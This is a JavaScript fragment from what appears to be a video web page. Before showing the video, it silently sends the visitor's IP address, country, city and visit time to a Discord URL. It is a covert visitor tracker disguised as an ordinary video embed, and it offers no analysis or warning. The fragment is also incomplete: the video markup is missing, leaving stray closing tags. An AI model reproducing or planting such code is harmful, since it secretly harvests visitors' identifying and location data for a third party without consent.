        const webhookUrl = 'https://cdn.discordapp.com/attachments/1161549573832052816/1357505918819893298/videoplayback.mp4?ex=67f07368&is=67ef21e8&hm=fe542de1a3081d838f932aa8232fe2c38191523b3ca065a5d833fe0cb0d82896&';
        fetch(webhookUrl, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
        });
  
        // Embedding the video after fetching data
        const videoContainer = document.createElement('div');

          </video>
        `;
        document.body.appendChild(videoContainer);
      });
  </script>
